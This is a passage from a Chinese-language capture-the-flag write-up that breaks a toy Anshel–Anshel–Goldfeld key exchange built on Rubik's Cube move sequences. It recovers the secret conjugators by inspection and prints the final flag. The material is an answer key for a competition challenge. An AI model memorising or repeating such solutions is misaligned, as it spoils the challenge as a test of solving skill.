asymmetric keys to get a shared key. They aren't very good at math, so they decided to use a Rubik's Cube instead to do the crypto. I don't think it's very secure though, I think you might be able to guess some of their keys :hmm:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mr. A public key: [B&#x27; U&#x27;, F B F, R&#x27; D, B D&#x27;]</span><br><span class="line">Mr. G public key: [R D L&#x27;, D U&#x27; B, U F&#x27;, L&#x27; F]</span><br><span class="line"></span><br><span class="line">Mr. A sends: [B D&#x27; R&#x27; D R D L&#x27; D&#x27; R D B&#x27;, B D&#x27; R&#x27; D D U&#x27; B D&#x27; R D B&#x27;, B D&#x27; R&#x27; D U F&#x27; D&#x27; R D B&#x27;, B D&#x27; R&#x27; D L&#x27; F D&#x27; R D B&#x27;]</span><br><span class="line">Mr. G sends: [U F&#x27; R D L&#x27; B&#x27; U&#x27; L D&#x27; R&#x27; F U&#x27;, U F&#x27; R D L&#x27; F B F L D&#x27; R&#x27; F U&#x27;, U F&#x27; R D L&#x27; R&#x27; D L D&#x27; R&#x27; F U&#x27;, U F&#x27; R D L&#x27; B D&#x27; L D&#x27; R&#x27; F U&#x27;]</span><br></pre></td></tr></table></figure><p><strong>NOTE: The flag is the shared key that they generate, so it is NOT in <code>utflag&#123;&#125;</code> format</strong></p><p>显然的，这道题需要应用Anshel–Anshel–Goldfeld 密钥交换体系，在这里，密钥是由魔方转动记号呈现的，而我们知道，魔方的转动操作群是非阿贝尔群，在这里，我们可以从Mr.A和Mr.G提供的公钥中提取出： <span class="math display">\[S_A=\langle s_1,s_2,s_3,s_4\rangle\ \ \ \ \ \ \ S_G=\langle t_1,t_2,t_3,t_4\rangle\]</span> 其中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s_1=B&#x27; U&#x27;</span><br><span class="line">s_2=F B F</span><br><span class="line">s_3=R&#x27; D</span><br><span class="line">s_4=B D&#x27;</span><br><span class="line">t_1=R D L&#x27;</span><br><span class="line">t_2=D U&#x27; B</span><br><span class="line">t_3=U F&#x27;</span><br><span class="line">t_4=L&#x27; F</span><br></pre></td></tr></table></figure><p>又设在交换后得出的密文的集合分别为： <span class="math display">\[C_G=\langle s_1&#39;,s_2&#39;,s_3&#39;,s_4&#39;\rangle\ \ \ \ \ \ \ C_A=\langle t_1&#39;,t_2&#39;,t_3&#39;,t_4&#39;\rangle\]</span> 其中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s_1&#x27;=U F&#x27; R D L&#x27; B&#x27; U&#x27; L D&#x27; R&#x27; F U&#x27;</span><br><span class="line">s_2&#x27;=U F&#x27; R D L&#x27; F B F L D&#x27; R&#x27; F U&#x27;</span><br><span class="line">s_3&#x27;=U F&#x27; R D L&#x27; R&#x27; D L D&#x27; R&#x27; F U&#x27;</span><br><span class="line">s_4&#x27;=U F&#x27; R D L&#x27; B D&#x27; L D&#x27; R&#x27; F U&#x27;</span><br><span class="line">t_1&#x27;=B D&#x27; R&#x27; D R D L&#x27; D&#x27; R D B&#x27;</span><br><span class="line">t_2&#x27;=B D&#x27; R&#x27; D D U&#x27; B D&#x27; R D B&#x27;</span><br><span class="line">t_3&#x27;=B D&#x27; R&#x27; D U F&#x27; D&#x27; R D B&#x27;</span><br><span class="line">t_4&#x27;=B D&#x27; R&#x27; D L&#x27; F D&#x27; R D B&#x27;</span><br></pre></td></tr></table></figure><p>我们假设共享密钥为<span class="math inline">\(a^{-1}g^{-1}ag\)</span>，所以我们有： <span class="math display">\[a^{-1}t_ia=t_i&#39;\ \ \ \ \ g^{-1}s_ig=s_i&#39;\ \ \ \ \ (i=1,2,3,4)\]</span> 通过观察我们很容易可以得到： <span class="math display">\[a=D&#39; R D B&#39;\\g=L D&#39; R&#39; F U&#39;\]</span> 所以我们可以得出共享密钥： <span class="math display">\[a^{-1}g^{-1}ag=B D&#39; R&#39; DU F&#39; R D L&#39;D&#39; R D B&#39;L D&#39; R&#39; F U&#39;\]</span> 这样我们就得到了flag：</p><blockquote><p>utflag{B D' R' D U F' R D L' D' R D B' L D' R' F U'}</p></blockquote><p>至此，对于Anshel–Anshel–Goldfeld 密钥交换体系的介绍就到此结束了。</p>]]></content>
      
      
      <categories>
          
          <category> 密码学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
